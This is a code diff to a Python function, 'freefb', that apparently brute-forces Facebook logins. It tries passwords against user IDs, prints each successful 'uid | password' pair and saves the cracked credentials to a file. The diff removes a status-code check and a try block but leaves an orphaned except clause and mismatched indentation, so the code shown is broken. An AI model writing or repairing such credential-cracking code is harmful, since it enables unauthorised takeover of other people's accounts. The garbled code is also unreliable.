@@ -139,11 +139,10 @@ def freefb(uid, name, pwx, tl):
                 )
                 
                 # Parse response
-                if response.status_code == 200:
-                    try:
-                        q = response.json()
+                
+                q = response.json()
                         
-                        if 'access_token' in q:
+                if 'access_token' in q:
                             print(f"\n\033[1;32m✅ [OK] {uid} | {pw}\033[1;37m")
                             oks.append(uid)
                             
@@ -152,7 +151,7 @@ def freefb(uid, name, pwx, tl):
                                 f.write(f'{uid}|{pw}\n')
                             break
                             
-                        elif 'error' in q:
+                elif 'error' in q:
                             error_msg = q['error'].get('message', '')
                             print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
                             if 'www.facebook.com' in error_msg:
@@ -165,13 +164,12 @@ def freefb(uid, name, pwx, tl):
                                 continue
                             else:
                                 continue
-                        else:
+                else:
                             continue
                             
                     except json.JSONDecodeError:
                         continue
-                else:
-                    continue
+                
                     
             except requests.exceptions.RequestException as e:
                 time.sleep(5)
